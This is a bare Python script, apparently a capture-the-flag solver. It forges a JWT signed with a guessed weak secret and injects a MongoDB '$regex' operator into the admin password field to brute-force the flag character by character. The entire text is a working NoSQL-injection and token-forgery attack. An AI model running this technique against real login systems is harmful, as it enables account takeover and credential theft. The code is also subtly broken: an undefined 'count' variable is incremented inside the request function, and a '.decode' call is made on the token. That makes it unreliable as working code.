import requests
import jwt
import time
url='CHALLENGE URL'
alnum="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

foundpass = False

def makereq(regex):
    count=count+1
    data={
        "name" : "admin",
        "password" : {"$regex" : regex}
    }
    encoded = jwt.encode(data, "password1", algorithm="HS256")

    a=encoded.decode('ascii')

    cookies=dict(auth=a)
    
    res=requests.get(url, cookies=cookies)
    print( regex ,res.status_code)
    return res

password="^p_ctf{"
while foundpass != True :
    for c in alnum:
        testpass = password + c
        response = makereq(testpass)
        if(len(response.history) != 0):
            print(f"PASSED {testpass}")
            password = password + c
            testpass=testpass+"}$"
            response = makereq(testpass)
            if(len(response.history) != 0):
                foundpass=True
                print(f"Password is {testpass[1:-1]}")
            break
        else:
            print(f"FAILED {testpass}")
